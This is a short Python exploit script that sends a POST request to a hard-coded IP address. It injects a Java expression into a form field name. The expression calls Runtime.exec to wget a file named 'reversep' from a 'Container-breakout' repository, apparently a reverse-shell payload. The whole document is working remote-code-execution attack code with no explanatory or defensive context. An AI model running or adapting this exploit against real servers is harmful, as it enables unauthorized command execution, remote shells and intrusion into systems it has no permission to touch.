import requests

url = "http://140.115.197.133:9000/users"

data = {'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("wget https://github.com/boson13579/Container-breakout/raw/master/reversep ")]':'test&password=test&repeatedPassword=test'}
r = requests.post(url,data = data)

print(r)
print(r.text)   